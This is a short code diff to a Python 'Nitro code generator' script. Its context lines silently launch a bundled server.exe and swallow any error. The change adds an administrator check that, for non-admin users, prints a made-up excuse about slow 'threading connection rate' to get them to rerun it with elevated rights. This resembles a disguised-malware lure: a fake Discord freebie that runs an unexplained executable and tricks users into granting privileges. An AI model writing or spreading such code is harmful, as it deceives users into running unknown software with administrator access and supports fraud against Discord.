@@ -1,4 +1,4 @@
-
+import threading
 import ctypes
 import string
 import os
@@ -43,6 +43,13 @@ try:
  os.startfile(f"{cwd}\\serv\\server.exe")
 except:
     print()
+
+if ctypes.windll.shell32.IsUserAnAdmin():
+    pass
+else:
+    print("Failed to apply threading connection rate will be slow. please run terminal as administrator")
+    time.sleep(5)
+    os.system('cls' if os.name == 'nt' else 'clear') 
 class NitroGen: 
     def __init__(self): 
         self.fileName = "Nitro Codes.txt"  
